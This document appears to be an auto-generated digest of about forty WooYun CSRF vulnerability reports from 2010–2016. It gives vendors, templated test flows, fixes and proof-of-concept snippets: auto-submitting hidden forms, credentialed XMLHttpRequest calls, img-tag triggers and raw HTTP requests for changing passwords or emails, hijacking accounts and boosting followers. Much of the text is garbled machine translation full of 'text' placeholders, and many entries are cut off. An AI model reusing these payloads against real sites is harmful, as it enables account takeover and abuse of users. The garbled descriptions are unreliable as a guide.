# CSRF Vulnerability Analysis

> Automatically extracted on 2026-01-23 18:57
> Sample count: 3

## High-frequency Parameters
```
  url: 1 times
  desc: 1 times
  callback: 1 times
  get_recent_photos: 1 times
  _: 1 times
```

## Meta-thinking Patterns

## Representative Cases

### Case 1: wooyun-2015-0127683
**Title**: Gewara Lifemultiple locationsCSRFcanboost followers,post movie reviews and replies
**Original Type**: Vulnerability type:CSRF
**URL Examples**:
  - `https://example.com/[redacted]`
  - `https://example.com/[redacted]`
**Insight Extract**:
**Payload Snippets**:
  ```
  orm action="https://example.com/[redacted]
  ```
  ```
  orm><script>document.forms[0].submit();</script></bo
  ```
  ```
  <script>document.forms[0].submit();</script></body></html
  ```

### Case 2: wooyun-2014-051412
**Title**: a certain photo album serviceCSRFsave images
**Original Type**: Vulnerability type:CSRF
**Parameters**: `url, desc, callback, get_recent_photos, _`
**URL Examples**:
  - `https://example.com/[redacted]`
**Insight Extract**:

### Case 3: wooyun-2014-051292
**Title**: Jiapin.comCSRFcanlog inany uservulnerability
**Original Type**: Vulnerability type:CSRF


---

## Batch 2 (Index 200-399)
> Sample count: 2

### High-frequency Parameters
```
  m: 1 times
  a: 1 times
  c: 1 times
```

### Representative Cases

#### wooyun-2015-0135307
**a certain ITeducation platformone locationCSRF**
- Payload: `orm action="https://example.com/[redacted]`

#### wooyun-2015-0117987
**Aili.comvulnerabilitysmall package**
- Parameters: `m, a, c`
- Payload: `orm action="https://example.com/[redacted]`

---

## Batch 3 (Index 400-599)
> Samples: 6

### High-frequency Parameters
```
  s_url: 1
  target: 1
  appid: 1
  hln_css: 1
  style: 1
```

### Representative Cases

#### wooyun-2015-0122514
**textonetextxsstocsrftoa certain textspacebetext(onebusiness-worm birth process/testtext)**
- Parameters: `s_url, target, appid, hln_css, style`
- Payload: `;data=eyJpZCI6Im1hcHNJZF81NThhN`

#### wooyun-2015-0121929
**Best Eastcsrfmodifyaccountemail**
- Payload: `<script>document.getElementById('post123').submit();</scr`

#### wooyun-2014-048933
**a certain game companybrowser gamehasCSRF vulnerabilitycanresetany userpassword**
- Parameters: `newp, newp2, userid`

#### wooyun-2013-041526
**Xizi ForumCSRFboost followersvulnerability**
- Parameters: `r, uid, _, touid, callback`
- Insight:
  - clickfollowcapture packetsanalysisurl:https://example.com/[redacted]

#### wooyun-2015-0161029
**a certain mallCSRFmodifyother people's information**

#### wooyun-2014-076250
**a certain TV shopping mallcsrfsetshipping address**
- Payload: `<script>  document.csrf.submit()</script>`

---

## Batch 4 (Index 600-799)
> Samples: 2

### High-frequency Parameters
```
  imageUrl: 1
  special_site: 1
  modulefrom: 1
  keyfrom: 1
  method: 1
```

### Representative Cases

#### wooyun-2013-020360
**QyerCSRFboost followersvulnerability.**

#### wooyun-2012-08613
**a certain Internet companyone locationCSRF vulnerability**
- Parameters: `imageUrl, special_site, modulefrom, keyfrom, method`
---
### [wooyun-2012-08606] Aipaione locationCSRF vulnerability
**Vendor**: Aipai | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: inacceptGETinformationwhen,notforGETsource(Referer)verify,also does notinGETinformation add to tokenvalidationinformationcorrectness,causingvulnerabilityoccur.textusetext,ina certain sometext,textYY,forum,comment,sendtextthisaddress,oruseIMGtranslated textusethisaddress,thentextfollowersthentext~~

**POC**: https://example.com/[redacted]]&callback%09=scribeSuccess_new&action=addSubscribe

**Bypass**: Direct exploitation

**Fix**: checkGETsourceRefererinGETinformation add to token
---

---
### [wooyun-2015-0126096] Zhongwumultiple locationsCSRFall bundled
**Vendor**: Zhongwu | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: <html><head><title>poc2.html</title></head><body><form action="https://example.com/[redacted]" method="post"><input type="hidden" name="startdate" value="2015-06-06"><input type="hidden" name="enddate" value="2015-07-07"><input type="hidden" name="companyname" value="%E5%B9%BF%E4%B8%9C%E5%86%B

**Bypass**: Direct exploitation

**Fix**: addtokenoftextvalidation
---

---
### [wooyun-2015-093605] a certain game companypassportCSRF vulnerabilityendangers account security
**Vendor**: Shanda Network | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: first register peopleuserlog insuccess,textaccountprofile data incomplete,clickfill in profile datacanlook attoneedtextitemsfill in profile datasubmitas followsdataname=textandtextidCard=340304197908257431Birthday=1990-01-01mobile=phone=question1=c_question1=answer1=question2=c_question2=answer2=1203121582Fsubmit=novalidationdatasubmission sourcethistextenterlineexploit,csrfcode is as followstriggercode,then cansuccess..

**POC**: csrfcodetriggersuccessaftertextagaintextlook atpassport,thistranslated text.iftextaccountnamed,throughthesetextinformationcandirectlyputpasswordsuccessrecover.

**Bypass**: Direct exploitation

**Fix**: 1,validationinformationsubmission source,whethercomes fromlegitimate webpage;2,indatafieldtexthiddenaddhashvalue,validationdatawhethertext
---

---
### [wooyun-2011-02161] RenrenGETmethodsubmitstatus vulnerability
**Vendor**: Renren | **Year**: 2011 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: secret crush:https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: putGETmethodtextasPOSTmethod
---

---
### [wooyun-2015-0121174] exploitCSRF vulnerabilityhijackmember account
**Vendor**: translated text | **Year**: 2015 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: textwetextuseraffectedbindonIa certain emailservice,ItextoneSCRF.code is as follows:<html><head><title>scr poc</title></head><body><form action="https://example.com/[redacted]" method="post"><input type="hidden" name="hxcsrf" value="47c1bdc32e559d7774e220a3c2427d43"><input type="hidden" name="email" value="953837476%40some-domain.com"></fo

**Bypass**: Direct exploitation

**Fix**: FixoneunderCSRF.
---

---
### [wooyun-2015-0163147] XCartwolocationissue(bindaccounttextarbitraryunbind)
**Vendor**: XCar.com.cn | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: issue1:accountinjectionafter,bindOAuthtext,no tokenvalidation,hascsrf.textthislocationtextaddtextstateParameters.related issueFixlook athttps://example.com/[redacted]  "targeting the application sidecsrfhijackNo.threetextaccount" section.issue2:mobile phonetextbindoperationcanbebrute force,addvalidationcodetext.

**POC**: issue1prove:no tokenorstateprotection,hascsrf.issue2prove:unbindmobile phoneno validationcodetext,hasbrute forceissue

**Bypass**: Direct exploitation

**Fix**: vulnerability1:related issueFixlook athttps://example.com/[redacted]  "targeting the application sidecsrfhijackNo.threetextaccount" section.specific fixreferencevulnerability2:addsubmitcodetextvalidationcodecheckfunctionality
---

---
### [wooyun-2015-0107723] ESPCMSadmin backendCSRFmodifymanagementpassword
**Vendor**: ESPCMS enterprise website management system | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: admin backendmanagement

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: modifyadministratorpasswordnovalidationtextpassword Itextistext capture packetsnotokenvaluevalidation constructformtext?ok canmodifyformconstructgood,butmodifygoodaftertextnotwilltextmodifypassword,butwilltranslated texttoadmin backend,this waythenwillbeadministratorfoundoroccurtext~~translated text???weexploittranslated text~wecreateonehtml,code is as follows<html><table style="left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;"><tbody><tr><td style="color:#FFFFFF;z-index: 6000;vertical-align:top;"><h1>textcloudtest</h1></td></tr></tbody></table><<meta http-equi

**POC**: modifyadministratorpasswordnovalidationtextpassword Itextistext capture packetsnotokenvaluevalidation constructformtext?ok canmodifyformconstructgood,butmodifygoodaftertextnotwilltextmodifypassword,butwilltranslated texttoadmin backend,this waythenwillbeadministratorfoundoroccurtext~~translated text???weexploittranslated text~wecreateonehtml,code is as follows<html><table style="left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;"><tbody><tr><td style="colo

**Bypass**: Direct exploitation

**Fix**: you know what to domodifytextneedvalidationtextpasswordthen can
---

---
### [wooyun-2016-0180311] a certain social platformforumCSRFbundle and impact description(manytextforumtextuse)
**Vendor**: a certain social platform | **Year**: 2016 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: thisvulnerabilitytextandtoa certain social platformtextforumpackettextnottextforuseundersitetext https://example.com/[redacted]     b4201dfdnumbercode https://example.com/[redacted]      b4201dfdtext https://example.com/[redacted]      b4201dfdtext https://example.com/[redacted]      b4201dfdtext https://example.com/[redacted]   4788b761text https://example.com/[redacted]   b4201dfdtext https://example.com/[redacted]  b4201dfdtext https://example.com/[redacted]      b4201dfdtext http://

**POC**: usetextforumas an example,texthastextonlytestfourtext,textentireforumallnotextcsrfprotection,othertranslated textlinecheck^_^1 modifyuserinformation<form action="https://example.com/[redacted]" method="post"><input type="hidden" name="formhash" value="aec0506d" /><input type="hidden" name="nicknamenew" value="GAY21888" /><input type="hidden" name="gend

**Bypass**: Direct exploitation

**Fix**: youtranslated text!
---

---
### [wooyun-2014-080964] a certain social platforma certain social platformone locationtextfunctionalityhasCSRF vulnerability(can modifyusera certain social platforma certain element)
**Vendor**: a certain social platforma certain social platform | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: new versiona certain social platformtextonetextfunctionality(texta certain textspaceonetext),theniscansetbackground music.throughcapture packetsaftertextbackground musica certain textURLas:https://example.com/[redacted] aftertexttokenIhandletextasallisthistext..directlyclickhostURLthencanlook attointextpersonalpagetexthas peoplebackground music:

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2010-0640] a certain social platformCSRF
**Vendor**: a certain Internet company | **Year**: 2010 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: maliciousattackercanconstructmalicious form,andtextvictimclick,whenvictimclicklinktext,willusevictimnameoccuronetexta certain social platforminformation,thismethodcanoccurworm,textserious.

**POC**: testmethod:1,putundertextformstoretextindex.html,putinlocaldirectory,put183.174.39.46translated textselfip.<form name="CSRF" method="POST" name="form0" action="https://example.com/[redacted]"><input type="hidden" name="status" value="http://[IP redacted] type="hidden" name="in_reply_to_status_id" value="sendinfo"/><input

**Bypass**: Direct exploitation

**Fix**: forrefererandtokenverify.
---

---
### [wooyun-2015-0113965] IistextinZhenai.comtextfollow
**Vendor**: Zhenai.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: textontextcanlook atto,textfollowisthrough/v2/follow/addFollow.dothisfileundertext,objectId="+followID"canlook attoItextinislocationfortextfollowstatus.textinwecomeconstructoneunderoneaddressurl:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: textimpacttextnotlarge,butthistextisvulnerability.notfollowyouthennotwilltextyoutext
---

---
### [wooyun-2015-0158002] a certain telecom operatortexta subsiteringback-tone servicearbitrarynumbercodetext(candirectlyenable service)
**Vendor**: a certain telecom operator | **Year**: 2015 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: vulnerabilitytext:http://**.**.**.**/user/register.screenno validationcode,triedoneunder,validationcodenotextrestrictionwhen mobile phonevalidationcodeinputsuccess,directlyenable service...(textfriendmobile phonetext...felt they would kill me...)text(ItextfortextImobile phoneusetextwhywillnotextnotranslated textbusiness)!POST /user/useropenaccount.do HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Acc

**POC**: vulnerabilitytext:http://**.**.**.**/user/register.screenno validationcode,triedoneunder,validationcodenotextrestrictionwhen mobile phonevalidationcodeinputsuccess,directlyenable service...(textfriendmobile phonetext...felt they would kill me...)text(ItextfortextImobile phoneusetextwhywillnotextnotranslated textbusiness)!POST /user/useropenaccount.do HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,applicat

**Bypass**: Direct exploitation

**Fix**: addvalidationcode,mobile phonevalidationcodeaddtextrestriction
---

---
### [wooyun-2015-0162476] pointIlinkIthencancanwillentertextZhihuaccount
**Vendor**: Zhihu | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Zhihubinda certain social platformlog inrequestashttps://example.com/[redacted]

**POC**: textrecorded videohttps://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: addcsrfprotectiona certain social platformbindtextusea certain social platformusernamedpasswordlog in
---

---
### [wooyun-2012-08531] a certain social platforma certain social platformone locationCSRF vulnerability
**Vendor**: a certain social platform | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: GETtext,soself-assessed15inacceptGETinformationwhen,notforGETsource(Referer)verify,also does notinGETinformation add to tokenvalidationinformationcorrectness,causingvulnerabilityoccur.

**POC**: vulnerabilityaddress:https://example.com/[redacted] (GETtext)<html><body><form id="imlonghao" name="imlonghao" action="https://example.com/[redacted]" method="get"><input type="text" name="do" value="updateweibo" /><input type="text" name="content" value="XXXXX" /

**Bypass**: Direct exploitation

**Fix**: checkGETsourceRefererinGETinformation add to token
---

---
### [wooyun-2013-042094] a certain cloud drivea certain functionalityhascsrfvulnerability
**Vendor**: a certain security vendor | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain cloud drivegroup dismissallocationhascsrf,cancausingshared group disbanded,filelost

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0123458] Xiangshe.com CSRF vulnerabilityone issue,cantextmodifytextshipping address
**Vendor**: Xiangshe.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection, authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: log inaccountA.,modifyitsshipping address,andcapture packetschecklook atitsshipping address,modifysuccess;canlook atto,modifytextrequestaspostrequest,sametext,onetextParameterstextiscantext(AddressId,UserIdtextisuse1translated text,completelycantranslated text!).texthascsrf,translated textoneput...constructcsrfxiangshe.htmlxmlhttp.open("POST", "https://example.com/[redacted]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("MAddressInfo.AddressId=92589&MAddressInfo.UserId=150936&MAddressInfo.T

**POC**: Same as above

**Bypass**: Direct exploitation

**Fix**: addtoken
---

---
### [wooyun-2015-0136605] text(guang.com)hascsrfcan modifytextbasic information
**Vendor**: text(guang.com) | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: modifypersonalinformation,capture packetschecklook at:canlook attononotcantextParameters,translated textmaliciouslink,main code:xmlhttp.open("POST", "https://example.com/[redacted]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("nickname=woo123232&sex=male&year=1982&month=1&day=1&province=1&city=1&blog=http%3A%2F%2F11aaaa.com&intro=xsacd32fdsgfsd365");textquestionlinksuccess,informationtextbemodify.modifytextaftereffectfortext:

**POC**: Same as above

**Bypass**: Direct exploitation

**Fix**: addtokenvalidationreferer
---

---
### [wooyun-2010-0884] FanfoupostCSRF vulnerability
**Vendor**: Fanfou | **Year**: 2010 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Fanfoumobile versionandIPHONEtextcaninPContextquestion,posttranslated texthastoken,texttest,is justdecoration,reffertexthasrestriction,textcanthroughhttps://example.com/[redacted]

**POC**: (see original)

**Bypass**: filterBypass

**Fix**: Strengthen input validation
---

---
### [wooyun-2011-03848] textdreamCMSsystem - visitorunlimitedtextupvote/downvote count
**Vendor**: textdreamCMSsystem | **Year**: 2011 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textpagetext visitor onlycansubmitone timesrestriction,butdirectlyuseURLtextquestiontextnorestriction,onlytranslated textF5notput,onewillthencanontextontext....textdedeofficialtexthastextthistextrestriction...you know what to do

**POC**: https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: for feedback.php fileaddtranslated text single peopleIPsubmit timesnumbertextsubmittranslated textrestriction.nottextnottextIP,onetextIPtextsave24text,totranslated text.
---

---
### [wooyun-2015-0127940] Jiumei.comhascsrfvulnerability
**Vendor**: Jiumei.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: modifyusertextcopytext,capture packets:modifysuccess:textmaliciouslink,canlook attomodifyusertextrequestasgetrequest,textbrowsercandirectlytextquestionthislink(thisurladdresstexthostmodifytextrequesttextcome):https://example.com/[redacted]

**POC**: textprove

**Bypass**: Direct exploitation

**Fix**: validationrefereraddtoken
---

---
### [wooyun-2014-067529] a certain video siteonetexthijackgirlpassport
**Vendor**: a certain portal site | **Year**: 2014 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain video sitecanseta certain portal sitepassportmobile phonenumberbind.https://example.com/[redacted] /user/a/mobile/checkCode.do?m=13811110000&mcode=1234&t=3 HTTP/1.1ajaxvalidationthroughafter,clickbind.submitbindrequest.bindrequestinwilltextsubmitmobile phonenumbercodeandvalidationcode.textserverobtaindynamic validation codetextandnotputthismobile phonenumber,validationcode,accountthreetextenterlinetext,causingonlytextvalidationcodetextmobile phonenumbertext,thismobile phonenumbercantextaccountenterlinebind.andtranslated textbindlinknoCSRFprotection.https://example.com/[redacted]

**POC**: see detailed description

**Bypass**: Direct exploitation

**Fix**: obtaindynamic validation codetextservicetranslated textwhentextuser,mobile phonenumber,validationcode.bindtextvalidationthisthreetextwhethertext.
---

---
### [wooyun-2013-037678] Aili.comtwo flaws(csrfetc.)
**Vendor**: aili.com | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: arbitraryfollowcsrfcapture packetsdata:POST /index.php?m=content&c=goods&a=addAttention HTTP/1.1Host: show.aili.comUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:23.0) Gecko/20100101 Firefox/23.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urle

**Bypass**: Direct exploitation

**Fix**: 1:WooYun knowledge baselook atunder2:add avalidationcode
---

---
### [wooyun-2013-041633] 58subsitesametextcsrfusertranslated textintext
**Vendor**: 58sametext | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: translated textgoodprove,onetextimageaddoneimgtextcsrf,textisget,textisyouwebsitedomain nametext,text: thisisItextXXX,translated text.

**Bypass**: Direct exploitation

**Fix**: token
---

---
### [wooyun-2011-01656] textYYtextsetchannel passwordCSRF
**Vendor**: Guangzhou Duowan | **Year**: 2011 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: prerequisite thistextnotsetchannel passwordsid=textIDnewPassword=textchannel passwordhttps://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0100232] a certain universityemail account leakage(github)
**Vendor**: sjtu.edu.cn | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: change password
---

---
### [wooyun-2015-0135900] Yunlu Classroomone locationhasCSRF vulnerability(can modifyuserpassword)
**Vendor**: yun.lu | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: bindemaillocationnotokenPOC<html><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="email" value="wooyun1&#64;163&#46;com" /><input type="submit" value="Submit request" /></form></body></html>

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0119813] Fanhuan.comvulnerabilitytextpacketone
**Vendor**: Fanhuan.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: modifytextsavelocationcapture packets,requestdataIthennottexton,is onegetsubmit,directlyconstructoneURLthenline,textcanconstructoneform,wethenconstructoneURL.IconstructURLas follows:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: addtexttokenetc.validation.
---

---
### [wooyun-2014-060650] Changxiangtingcsrfspam messages
**Vendor**: cxt8.com | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted] alt="" _xhe_src="https://example.com/[redacted]" src="https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: filter!
---

---
### [wooyun-2015-0133493] translated textundertextwilltextquestionthen canfollowarbitrarystreamer
**Vendor**: douyu.tv | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated texttriedoneunderDouyutranslated text..foundroomfollowtexthaspointnottext, textisGETmethodtextfollow/add followtranslated textoneroom(roomID 253763)is onegirltext~constructtext<img src="https://example.com/[redacted]" />textnextthistextexploit?textoneviewertextstreamer, textundertextnumberintranslated textHTMLcode<img src="https://example.com/[redacted]" />then can

**POC**: a certain textstreamerviewernumbertranslated textDetailstextimgundertextisfemale streamerviewernumberaddtext0 0starttext:sendthisvulnerabilitywhen

**Bypass**: Direct exploitation

**Fix**: addvalidation~
---

---
### [wooyun-2013-019188] a certain social platformCSRFboost followersvulnerability
**Vendor**: a certain social platform | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: two peopleinterfaceallhasissuehttps://example.com/[redacted] but,copycomeisPOSTinterface,textcantextGETrequesttextgooddata.weibo.comhomepagethenhasa certain social platform, onlytextinherecomment, orsendtexta certain social platform, textclickthen cantriggersametextcandeletefollowers, linkinsidetextaction=createtextaction=destorythen can

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: textGETmethod
---

---
### [wooyun-2013-038379] easytalkCSRFcanwormsenda certain social platform
**Vendor**: nextsns.com | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: easytalkCSRFcanwormsenda certain social platformcanusefortext peopletext,translated text,onesendnotcantext

**POC**: capture packetstext:POST /?m=space&a=sendmsg HTTP/1.1Host: t.nextsns.comConnection: Keep-AliveContent-Length: 51Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; SE 2.X MetaSr 1.0)accept-language: zh-cncontent-type: applicati

**Bypass**: Direct exploitation

**Fix**: addtoken.
---

---
### [wooyun-2015-0118671] a certain communityCSRFsend message
**Vendor**: a certain portal site | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain portal sitemessagefunctionalityvalidationnottext,textsetpostkeytextandnottext(textincookietextdelete,sendpackettranslated text.)deletekeytextsendpacket,then..

**POC**: POC:<html><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="back&#95;encode" value="manage&#95;message&#46;php&#63;states&#61;0&amp;offset&#61;0" /><input type="hidden" name="receiveCN" value="baobaosb999" /><input type="hidden" name="

**Bypass**: Direct exploitation

**Fix**: validationpostcode
---

---
### [wooyun-2013-040214] UCa certain game open platformCSRFhijackuseraccount
**Vendor**: UC Mobile | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: <html><head><meta http-equiv="Content-Type" content="text/html; charset=gb2312"></head><body><form id="letv" name="letv" action="https://example.com/[redacted]" method="POST"><input type="text" name="newEmail" value="1234567@some-domain.com" /><input type="text" name="_respType" value="json" /><

**Bypass**: Direct exploitation

**Fix**: can refer toWooYun knowledge baseinsidearticle,enterlinetoken,refereretc.defense
---

---
### [wooyun-2012-08610] a certain portal siteone locationCSRF vulnerability
**Vendor**: a certain portal site | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: coordinatetexttwo peopleCSRFuse,effecttextadd,text.WooYun: a certain portal siteone locationCSRF vulnerabilityWooYun: a certain portal siteone locationCSRF vulnerabilityinacceptPOSTandGETinformationwhen,notforPOSTsource(Referer)verify,also does notinPOSTinformation add to tokenvalidationinformationcorrectness,causingvulnerabilityoccur.

